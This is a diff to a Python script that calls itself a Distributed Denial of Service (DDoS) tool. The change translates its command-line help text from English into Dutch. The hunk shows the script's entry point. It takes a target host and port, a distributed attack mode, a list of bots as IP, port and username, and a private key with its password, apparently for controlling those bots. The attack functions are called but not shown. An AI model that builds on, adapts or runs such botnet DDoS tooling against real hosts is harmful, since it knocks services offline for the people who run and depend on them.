@@ -63,13 +63,13 @@ def start_dos_script(target_host, target_port, isDistributed=False, bot_list="",
         execute_http_dos(target_host,target_port)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Distributed Denial of Service (DDoS) script.")
-    parser.add_argument("target_host", type=str, help="Target host IP address or domain.")
-    parser.add_argument("target_port", type=int, help="Target host port.")
-    parser.add_argument("--distributed", action="store_true", help="Enable distributed attack mode.")
-    parser.add_argument("--bot_list", type=str, help="List of bots in the format 'IP:Port:Username'.")
-    parser.add_argument("--private_key", type=str, help="Path to the private key file.")
-    parser.add_argument("--password", type=str, help="Password for the private key file.")
+    parser = argparse.ArgumentParser(description="Script voor Gedistribueerde Denial of Service (DDoS) aanvallen")
+    parser.add_argument("target_host", type=str, help="IP-adres of domein van het doelwit")
+    parser.add_argument("target_port", type=int, help="Poort van het doelwit")
+    parser.add_argument("--distributed", action="store_true", help="Schakel gedistribueerde aanvalmodus in")
+    parser.add_argument("--bot_list", type=str, help="Lijst van bots in het formaat 'IP:Poort:Gebruikersnaam'")
+    parser.add_argument("--private_key", type=str, help="Pad naar het bestand met de privésleutel")
+    parser.add_argument("--password", type=str, help="Wachtwoord voor het bestand met de privésleutel")
 
     args = parser.parse_args()
     start_dos_script(args.target_host, args.target_port, args.distributed, args.bot_list, args.private_key, args.password)
